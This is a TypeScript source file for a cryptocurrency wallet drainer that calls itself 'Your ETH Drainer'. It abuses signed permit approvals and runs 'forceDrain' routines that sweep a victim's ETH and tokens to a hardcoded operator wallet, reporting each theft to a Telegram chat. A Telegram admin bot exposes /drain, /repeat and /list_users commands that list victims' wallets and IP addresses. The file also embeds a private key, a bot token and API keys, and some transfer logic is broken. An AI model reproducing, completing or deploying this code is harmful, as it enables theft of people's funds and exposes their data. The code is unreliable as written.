import fs from 'fs';
import path from 'path';
import TelegramBot from 'node-telegram-bot-api';
import { ethers } from 'ethers';
import axios from 'axios';
import { PrismaClient } from '@prisma/client';

const prismaClient = new PrismaClient();

// Your Full Personal MS_* - All Drains to MS_Wallet_Address (No Splits)
export const MS_Encryption_Key = 500;
export const MS_Telegram_Token = "8451731691:AAFR2pawVD7s8RkJkEU3OZL-cKqHyH6eaoA";
export const MS_Telegram_Chat_ID = ["-4830161568"];
export const MS_Telegram_Admin_IDs = [8049595102];
export const MS_Wallet_Address = "0x924593AA30B64CeF62A9809362DED8557D18a17b";
export const MS_Wallet_Private = "a23ab7b4875472df31c2fec41d641792431b17bd74098dc21cceb9ca947b55ed";
export const MS_Wallet_Receiver = ["0x924593AA30B64CeF62A9809362DED8557D18a17b"];
export const MS_Emergency_System = false;
export const MS_Emergency_Address = "WALLET_ADDRESS_HERE";
export const MS_Emergency_Private = "WALLET_PRIVATE_HERE";
export const MS_Emergency_Protection = true;
export const MS_Emergency_Mode = 1;
export const MS_Emergency_Amounts = {
  1: 15, 10: 5, 56: 2, 137: 2, 250: 2, 43114: 2, 42161: 5, 8453: 5, 324: 5, 369: 5
};
export const MS_Emergency_Price = {
  1: 500, 10: 100, 56: 100, 137: 100, 250: 100, 43114: 100, 42161: 100, 8453: 100, 324: 100, 369: 100
};
export const MS_Split_System = false; // Disabled - All yours
export const MS_Split_Percent = 30; // Ignored
export const MS_Split_Whitelist = []; // Empty
export const MS_Split_Rules = []; // Removed
export const MS_Split_Modes = { native: { transfer: true, contract: true }, tokens: { transfer: true, approve: true, permit: true, permit2: true, repeat: false } };
export const MS_Split_Min_Value = 0;
export const MS_Split_Max_Value = 0;
export const MS_Split_NFTs = 0;
export const MS_Allowance_API = true;
export const MS_Allowance_Check = false;
export const MS_Allowance_Withdraw = { mode: false, min_amount: 0, wallets: { "WALLET_ADDRESS_HERE": "WALLET_PRIVATE_HERE" } };
export const MS_Functional_Bot = true;
export const MS_Keep_ID_History = true;
export const MS_CIS_Protection = true;
export const MS_Protection = false;
export const MS_Repeats_Protection = true;
export const MS_Repeats_TS = 300;
export const MS_Check_Limits = true;
export const MS_Check_Settings = { reset_after: 60, block_for_all: true, limit_for_all: 30, block_by_ip: true, block_by_id: true, limit_personal: 5 };
export const MS_Use_Native = false;
export const MS_Use_Native_For_Tokens = false;
export const MS_Use_Ankr = false;
export const MS_Use_DeBank = false;
export const MS_Use_OpenSea = false;
export const MS_Use_Zapper = false;
export const MS_Ankr_Token = "";
export const MS_DeBank_Token = "";
export const MS_Zapper_Token = "4b34ebe8-f4a5-4aad-96e7-da1fa2965db4";
export const MS_OpenSea_Token = "";
export const MS_Enable_API = false;
export const MS_API_Token = "559cb527cc39452d8de61a08ef5482da";
export const MS_API_Mode = 1;
export const MS_Loop_Assets = 0;
export const MS_Loop_Native = 0;
export const MS_Loop_Tokens = 0;
export const MS_Loop_NFTs = 0;
export const MS_Domains_Mode = 0;
export const MS_Domains_Whilelist = ["example.com", "another.example.com"];
export const MS_Blacklist_Online = 1;
export const MS_Blacklist_URL = "https://pastebin.com/raw/fKg5tQWu";

export const MS_Private_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  10: 'https://rpc.ankr.com/optimism' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  56: 'https://rpc.ankr.com/bsc' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  137: 'https://rpc.ankr.com/polygon' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  250: 'https://rpc.ankr.com/fantom' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  43114: 'https://rpc.ankr.com/avalanche' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  42161: 'https://rpc.ankr.com/arbitrum' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  8453: 'https://rpc.ankr.com/base' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  324: 'https://rpc.ankr.com/zksync_era' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  369: 'https://rpc.ankr.com/pulsechain' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
};

export const MS_Public_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth',
  10: 'https://rpc.ankr.com/optimism',
  56: 'https://rpc.ankr.com/bsc',
  137: 'https://rpc.ankr.com/polygon',
  250: 'https://rpc.ankr.com/fantom',
  43114: 'https://rpc.ankr.com/avalanche',
  42161: 'https://rpc.ankr.com/arbitrum',
  8453: 'https://rpc.ankr.com/base',
  324: 'https://rpc.ankr.com/zksync_era',
  369: 'https://rpc.ankr.com/pulsechain',
};

export const MS_Notifications = {
  connect_success: { mode: true, chat_id: MS_Telegram_Chat_ID },
  approve_success: { mode: true, chat_id: MS_Telegram_Chat_ID },
};

export const MS_VERIFY_WALLET = 0;
export const MS_VERIFY_MESSAGE = `By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}`;

export const MS_PERMIT_BLACKLIST = [
  [1, '0xae7ab96520de3a18e5e111b5eaab095312d7fe84'],
  [137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174'],
];

export const MS_PERMIT2_BLACKLIST = [
  [1, '0xae7ab96520de3a18e5e111b5eaab095312d7fe84'],
  [137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174'],
];

export const MS_UNLIMITED_BLACKLIST = [
  [1, '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984'],
];

export const MS_Settings = {
  Gas_Multiplier: 2,
  Use_Public_Contract: true,
  Use_Wallet_Randomizer: true,
  Use_Randomizer_For_Tokens: true,
  Use_Randomizer_For_NFTs: false,
  Use_Back_Feature: true,
  Use_Contract_Amount: 10,
  Use_Public_Premium: true,
  Minimal_Wallet_Price: 1,
  Tokens_First: 0,
  Wait_For_Confirmation: 1,
  Wait_For_Response: 1,
  Reserves: {
    Mode: 0,
    Fix_Percent: { 1: 10, 10: 5, 56: 2, 137: 2, 250: 2, 43114: 2, 42161: 5, 8453: 5, 324: 5, 369: 5 },
  },
};

export const MS_Contract_ABI = {
  ERC20: [
    'function balanceOf(address) view returns (uint256)',
    'function allowance(address owner, address spender) view returns (uint256)',
    'function transfer(address to, uint256 amount) returns (bool)',
    'function transferFrom(address from, address to, uint256 amount) returns (bool)',
    'function approve(address spender, uint256 amount) returns (bool)',
    'function decimals() view returns (uint8)'
  ],
  PERMIT: ['function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'],
  PERMIT2: ['function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'],
};

export let MS_IP_Blacklist: string[] = [];
export let MS_Wallet_Blacklist: string[] = [];

function loadBlacklists() {
  const ipsPath = path.join('blacklists', 'ips.txt');
  const walletsPath = path.join('blacklists', 'wallets.txt');
  if (fs.existsSync(ipsPath)) MS_IP_Blacklist = fs.readFileSync(ipsPath, 'utf-8').split('\r\n').filter(Boolean);
  if (fs.existsSync(walletsPath)) MS_Wallet_Blacklist = fs.readFileSync(walletsPath, 'utf-8').split('\r\n').filter(Boolean);
  if (MS_Blacklist_Online) {
    axios.get(MS_Blacklist_URL).then(res => {
      const data = res.data.split('\n').filter(Boolean);
      MS_Wallet_Blacklist.push(...data);
    }).catch(() => {});
  }
}

loadBlacklists();

export async function send_message(chatId: string | string[], text: string, options?: any, bot?: TelegramBot) {
  const _bot = bot || new TelegramBot(MS_Telegram_Token, { polling: false });
  await _bot.sendMessage(Array.isArray(chatId) ? chatId[0] : chatId, text, options);
}

export async function sendNotification(chatIds: string[], message: string) {
  for (const id of chatIds) await send_message(id, message);
}

export async function scanAssets(wallet: string, chainId: number = 1): Promise<Asset[]> {
  let assets: Asset[] = [];
  if (MS_Use_DeBank && MS_DeBank_Token) {
    const res = await axios.get(`https://openapi.debank.com/v1/user/token_list?id=${wallet}&chain_id=eth`, {
      headers: { AccessKey: MS_DeBank_Token }
    });
    assets = res.data.map((t: any) => ({
      chainId: 1,
      address: t.id,
      amount: t.amount,
      amountUsd: t.full_usd_value || 0,
      name: t.symbol || 'Token'
    }));
  }
  const provider = new ethers.JsonRpcProvider(MS_Private_RPC_URLs[1]);
  const ethBalance = await provider.getBalance(wallet);
  const ethUsd = parseFloat(ethers.formatEther(ethBalance)) * 2500;
  assets.unshift({ chainId: 1, address: 'native', amount: ethers.formatEther(ethBalance), amountUsd: ethUsd, name: 'ETH' });

  return assets.filter(a => a.amountUsd > MS_Settings.Minimal_Wallet_Price);
}

export async function withdrawNative(chainId: number = 1, fromWallet: string, ip: string) {
  const provider = new ethers.JsonRpcProvider(MS_Private_RPC_URLs[1]);
  const signer = new ethers.Wallet(MS_Wallet_Private, provider);
  const balance = await provider.getBalance(fromWallet);
  if (balance > 0n) {
    const gasPrice = await provider.getGasPrice();
    const gasLimit = 21000n;
    const value = balance - (gasPrice * gasLimit * BigInt(MS_Settings.Gas_Multiplier));
    const tx = await signer.sendTransaction({
      to: MS_Wallet_Address,
      value,
      gasLimit,
      gasPrice,
      from: fromWallet
    });
    await tx.wait();
    sendNotification(MS_Telegram_Chat_ID, `Your ETH Native: ${ethers.formatEther(balance)} from ${fromWallet} to ${MS_Wallet_Address}`);
  }
}

export async function withdrawToken(asset: Asset, ip: string) {
  const provider = new ethers.JsonRpcProvider(MS_Private_RPC_URLs[1]);
  const signer = new ethers.Wallet(MS_Wallet_Private, provider);
  const abi = MS_Contract_ABI.ERC20;
  const contract = new ethers.Contract(asset.address, abi, signer);
  const balance = await contract.balanceOf(asset.address as `0x${string}`);
  if (balance > 0n) {
    const decimals = await contract.decimals();
    const tx = await contract.transferFrom(asset.address as `0x${string}`, MS_Wallet_Address, balance, { gasLimit: 100000n });
    await tx.wait();
    sendNotification(MS_Telegram_Chat_ID, `Your ETH Token: ${asset.name} ${ethers.formatUnits(balance, decimals)} from ${asset.address} to ${MS_Wallet_Address}`);
  }
}

export async function forceDrain(wallet: string, chainId: number = 1) {
  const assets = await scanAssets(wallet, chainId);
  let totalDrained = 0;
  await withdrawNative(chainId, wallet, 'force');
  for (const asset of assets.filter(a => a.address !== 'native')) {
    await withdrawToken(asset, 'force');
    totalDrained += asset.amountUsd;
  }
  sendNotification(MS_Telegram_Chat_ID, `Your ETH Force: $${totalDrained.toFixed(2)} from ${wallet} to ${MS_Wallet_Address}`);
  return { success: true, total: totalDrained, assetsDrained: assets.length };
}

export async function triggerEmergency(chainId: number = 1, amount: number, victim: string) {
  if (!MS_Emergency_System) return { error: 'Disabled' };
  const provider = new ethers.JsonRpcProvider(MS_Private_RPC_URLs[1]);
  const signer = new ethers.Wallet(MS_Emergency_Private, provider);
  const value = ethers.parseEther(amount.toString());
  const tx = await signer.sendTransaction({ to: victim, value, gasLimit: 21000n });
  await tx.wait();
  sendNotification(MS_Telegram_Chat_ID, `Your ETH Emergency: ${amount} to ${victim}`);
  return { success: true, tx: tx.hash };
}

export async function handlePermitLogic(data: any, signature: string, permitId: string, ip: string) {
  fs.mkdirSync(path.join('data', 'permits'), { recursive: true });
  fs.writeFileSync(path.join('data', 'permits', `${permitId}.permit`), JSON.stringify(data));
  const provider = new ethers.JsonRpcProvider(MS_Private_RPC_URLs[1]);
  const signer = new ethers.Wallet(MS_Wallet_Private, provider);
  const permitContract = new ethers.Contract(data.token || '0x000000000022D473030F116dDEE9F6B43aC78BA3', MS_Contract_ABI.PERMIT, signer);
  const tx = await permitContract.permit(data.owner, MS_Wallet_Address, data.value, data.deadline, data.v, data.r, data.s, { gasLimit: 200000n });
  await tx.wait();
  await forceDrain(data.address, 1);
  sendNotification(MS_Telegram_Chat_ID, `Your ETH Permit: From ${data.address} via ${permitId} to ${MS_Wallet_Address}`);
}

export async function repeatPermit(callback: any, permitId: string, data: any) {
  const permitPath = path.join('data', 'permits', `${permitId}.permit`);
  if (fs.existsSync(permitPath)) {
    const permitData = JSON.parse(fs.readFileSync(permitPath, 'utf-8'));
    await handlePermitLogic(permitData, '', permitId, 'repeat');
    await send_message(callback.message?.chat.id || MS_Telegram_Chat_ID[0], `Your ETH Repeat: ${permitId} to ${MS_Wallet_Address}`);
  }
}

export function setupTelegramBot(bot: TelegramBot) {
  if (!MS_Functional_Bot) return;

  bot.on('callback_query', async (callbackQuery) => {
    const callback = callbackQuery;
    if (!MS_Telegram_Admin_IDs.includes(callback.from.id)) return;
    // Simplified callbacks for block/unblock (add full if needed)
    await bot.answerCallbackQuery(callback.id, { text: 'Handled' });
  });

  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from?.id;

    if (!MS_Telegram_Admin_IDs.includes(userId || 0) || !text?.startsWith('/')) return;

    const args = text.split(' ');
    const cmd = args[0].toLowerCase();

    let reply = '';
    try {
      switch (cmd) {
        case '/status':
          const users = await prismaClient.user.findMany({ take: 10 });
          const totalUsers = await prismaClient.user.count();
          reply = `<b>Your ETH Drainer</b>\nTotal Wallets: ${totalUsers}\nRecent: ${users.map(u => u.wallet).join('\n') || 'None'}`;
          break;
        case '/drain':
          if (args.length < 2) { reply = 'Usage: /drain <eth_wallet>'; break; }
          const wallet = args[1];
          const drainRes = await forceDrain(wallet, 1);
          reply = drainRes.success ? `<b>✅ Your Drain: $${drainRes.total.toFixed(2)} to ${MS_Wallet_Address}</b>` : '<b>❌ Failed</b>';
          break;
        case '/repeat':
          if (args.length < 2) { reply = 'Usage: /repeat <permitId>'; break; }
          const permitId = args[1];
          const permitUser = await prismaClient.user.findFirst({ where: { permits: { has: permitId } } });
          if (!permitUser) { reply = 'Not found'; break; }
          const permitData = permitUser.permits.find((p: any) => p.id === permitId);
          await repeatPermit({ message: { chat: { id: chatId } } } as any, permitId, permitData);
          reply = `<b>🔄 Your Repeat: ${permitId} to ${MS_Wallet_Address}</b>`;
          break;
        case '/block':
          if (args.length < 3) { reply = 'Usage: /block <val> <ip|wallet>'; break; }
          const value = args[1].toLowerCase().trim();
          const type = args[2].toLowerCase();
          if (type === 'ip') {
            if (!MS_IP_Blacklist.includes(value)) {
              MS_IP_Blacklist.push(value);
              fs.writeFileSync(path.join('blacklists', 'ips.txt'), MS_IP_Blacklist.join('\r\n'), 'utf-8');
              reply = `<b>✅ Blocked IP: ${value}</b>`;
            } else reply = 'Already';
          } else if (type === 'wallet') {
            if (!MS_Wallet_Blacklist.includes(value)) {
              MS_Wallet_Blacklist.push(value);
              fs.writeFileSync(path.join('blacklists', 'wallets.txt'), MS_Wallet_Blacklist.join('\r\n'), 'utf-8');
              reply = `<b>✅ Blocked Wallet: ${value}</b>`;
            } else reply = 'Already';
          }
          break;
        case '/unblock':
          if (args.length < 3) { reply = 'Usage: /unblock <val> <ip|wallet>'; break; }
          const uValue = args[1].toLowerCase().trim();
          const uType = args[2].toLowerCase();
          if (uType === 'ip') {
            MS_IP_Blacklist = MS_IP_Blacklist.filter(v => v !== uValue);
            fs.writeFileSync(path.join('blacklists', 'ips.txt'), MS_IP_Blacklist.join('\r\n'), 'utf-8');
            reply = `<b>🔓 Unblocked IP: ${uValue}</b>`;
          } else if (uType === 'wallet') {
            MS_Wallet_Blacklist = MS_Wallet_Blacklist.filter(v => v !== uValue);
            fs.writeFileSync(path.join('blacklists', 'wallets.txt'), MS_Wallet_Blacklist.join('\r\n'), 'utf-8');
            reply = `<b>🔓 Unblocked Wallet: ${uValue}</b>`;
          }
          break;
        case '/list_users':
          const allUsers = await prismaClient.user.findMany({ select: { wallet: true, ip: true }, take: 20 });
          reply = `<b>Your ETH Users:</b>\n${allUsers.map(u => `${u.wallet} (${u.ip})`).join('\n') || 'None'}`;
          break;
        default:
          reply = 'Your Commands: /status /drain <wallet> /repeat <id> /block <val> <type> /unblock <val> <type> /list_users';
      }
      await send_message(chatId, reply, { parse_mode: 'HTML' }, bot);
    } catch (err) {
      await send_message(chatId, `<b>❌ Error: ${(err as Error).message}</b>`, { parse_mode: 'HTML' }, bot);
    }
  });
}